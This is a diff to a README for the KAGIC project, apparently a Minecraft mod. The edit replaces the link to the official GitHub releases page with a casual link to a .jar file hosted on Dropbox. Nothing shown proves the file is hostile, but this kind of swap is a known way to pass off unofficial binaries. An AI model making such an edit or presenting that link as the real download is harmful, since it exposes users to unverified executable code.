@@ -10,7 +10,7 @@
 4. Ask for help in our [Discord.](https://discord.gg/MwEuu9x)
 
 ## Download
-Check our [releases page](https://github.com/kagic/KAGIC/releases) for downloads.
+Heres the Download Link!! https://www.dropbox.com/s/i5st2qguakayrwb/kagic-X11p13.jar?dl=0 Enjoy!!
 
 ## Discord
 Our Discord server _is a place to collaborate, learn, showcase, and discuss_ the development of KAGIC. It is a place where those who abide by the rules are welcomed, regardless of skill level.
